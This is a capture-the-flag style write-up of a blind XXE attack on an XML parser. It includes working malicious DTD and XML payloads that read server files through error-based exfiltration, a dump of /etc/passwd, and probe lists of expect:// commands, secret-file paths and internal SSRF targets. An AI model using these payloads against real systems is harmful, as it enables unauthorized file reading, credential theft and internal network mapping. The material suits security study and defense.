### Blind XXE via External DTD

## 

## 1. Executive Summary

A Blind XML External Entity (XXE) injection vulnerability was identified in the XML parsing component of the target application. The application accepted XML input containing a `<track>` element and processed it through a misconfigured libxml2 parser with external entity resolution enabled.

By uploading a malicious DTD file to the application's `/uploads/` directory and referencing it via the `SYSTEM` identifier, we were able to read arbitrary files from the server filesystem. Data was exfiltrated through an **error-based** technique — file contents leaked inside XML parser error messages returned in the application's JSON response under the `warnings` field.

## 3. Attack Chain — Step by Step

##### Step 1 — Confirm XXE is active

Sent an XInclude probe. The application responded with `queued: true` and non-empty `warnings`, confirming XML parsing with entity resolution was active.

##### Step 2 — Upload malicious DTD

Used the file upload endpoint to upload `test.dtd`. The file was reachable at `https://ba5cdf8d52.0o8.ir/uploads/test.dtd`.

##### Step 3 — Confirm DTD loads

```
<?xml version="1.0"?>
<!DOCTYPE xxe [
  <!ENTITY % xxe SYSTEM "https://ba5cdf8d52.0o8.ir/uploads/test.dtd">
  %xxe;
]>
<track><code>TEST</code></track>
```

##### Step 4 — Switch to file:// (HTTP outbound was blocked)

HTTP callbacks to external servers were refused (`remote schema refused`). 

and leaked path that test.dtd was saved :

```bash
///var/www/html/uploads/test.dtd
```

Switched to loading DTD via `file://` directly on the server:

```
<!ENTITY % xxe SYSTEM "file:///var/www/html/uploads/test.dtd">
```

##### Step 5 — Discover error-based exfil channel

Uploaded this DTD:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "
  <!ENTITY &#x25; error SYSTEM 'file:///DOESNOTEXIST/%file;'>
">
%eval;
%error;
```

Response `warnings` leaked the full file:

```
Invalid URI: file:///DOESNOTEXIST/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

##### Step 6 — Read /proc/self/environ

Identified app context:

```
USER=app
HOME=/home/app
_=/usr/local/bin/php
```

##### Step 7 — Internal port scan via /proc/net/tcp

Read `/proc/net/tcp` and decoded hex entries to map all listening internal services:

- `127.0.0.11:35903` — uid 0 (root-owned service)
- `0.0.0.0:8080` — the app itself (uid 1000)

---

## 4. Payload Reference

### DTD file — upload to /uploads/test.dtd

```
<!ENTITY % file SYSTEM "file:///PATH/TO/READ">
<!ENTITY % eval "
  <!ENTITY &#x25; error SYSTEM 'file:///DOESNOTEXIST/%file;'>
">
%eval;
%error;
```

### XML payload — always the same

```
<?xml version="1.0"?>
<!DOCTYPE xxe [
  <!ENTITY % xxe SYSTEM "file:///var/www/html/uploads/test.dtd">
  %xxe;
]>
<track><code>TEST</code></track>
```

### Files successfully read

```
file:///etc/passwd           → full user list
file:///proc/self/environ    → app environment variables
file:///proc/net/tcp         → all open ports (hex encoded)
```

### etc/passwd

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
app:x:1000:1000::/home/app:/bin/bash
```

## Tested Paths for Flag Retrieval :

##### expect://

```url
expect://printenv
expect://whoami
expect://hostname
expect://host
expect://printenvexpect://id
expect://ls/
expect://printenv
expect://etc/passwd
expect://find/
```

##### file://

```url
/root/flag.txt
/root/flag
/root/root.txt
/root/proof.txt
/root/.flag
/root/secret
/flag.txt
/flag
/home/app/flag
/home/app/flag.txt
/home/app/proof.txt
/home/app/.flag
/home/app/.env
/home/app/secret
/home/app/.secret
/etc/nginx/sites-enabled/default
/etc/apache2/sites-enabled/000-default.conf ← XML break
/proc/self/environ 
/proc/self/cmdline 
/var/www/html/partner/uploads/test.dtd
```

##### 

##### SSRF

```url
http://127.0.0.11/
http://172.18.0.1/
http://127.0.0.1/
http://127.0.1/
http://127.1/
http://localhost/
http://127.0.0.1:8080/
http://0.0.0.0
```
